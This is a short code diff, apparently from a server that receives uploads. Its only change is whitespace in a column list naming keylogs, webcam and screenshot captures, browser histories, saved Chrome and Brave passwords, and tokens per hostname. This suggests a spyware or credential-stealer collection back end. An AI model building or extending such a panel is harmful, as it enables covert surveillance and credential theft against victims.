@@ -13,7 +13,7 @@ os.makedirs(UPLOAD_ROOT, exist_ok=True)
 COLUMNS = [
     "Hostname", "Timestamp", "Desktop Screenshot", "Webcam", "Keylogs",
     "Decoded Keylogs", "Chrome History", "Brave History", "Chrome Passwords",
-    "Brave Passwords", "Tokens", "Recent Files", "File Access Log"
+    "Brave Passwords", "Tokens", "Recent Files", "File Access Log" 
 ]
 
 HTML_TEMPLATE = '''
